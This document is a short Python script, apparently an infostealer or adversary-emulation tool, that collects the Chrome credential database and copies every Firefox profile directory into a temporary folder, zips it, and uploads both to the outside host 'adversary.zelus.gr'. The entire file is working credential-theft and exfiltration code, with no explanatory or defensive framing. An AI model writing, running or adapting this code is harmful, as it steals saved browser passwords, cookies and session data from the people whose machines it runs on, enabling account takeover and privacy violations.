import path_utils as pu
import requests as r
import netutils
import shutil
import os

recvserv = "http://adversary.zelus.gr/payload"

chrome_creds = pu.get_chrome_path()
try:
    netutils.send_file(chrome_creds, "chromecreds.sqlite",recvserv)
except Exception as e:
    print(e)

firefox_path = pu.get_firefox_path()
root_dest = f"{pu.create_tmp_path()}"

print(f"[*] Temp dir: {root_dest}")

try:
    for directory in os.listdir(firefox_path):
        profile = os.path.join(firefox_path, directory)
        for file in os.listdir(profile): 
            filepath = os.path.join(profile, file) 
            print(filepath)
            try:
                dest = filepath.replace(firefox_path, root_dest)
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                shutil.copy(filepath, dest)
            except Exception as e:
                print(e)

    shutil.make_archive(root_dest, 'zip', root_dest)
    netutils.send_file(root_dest + ".zip", "firefoxcreds.zip", recvserv)

except Exception as e:
    print(e)
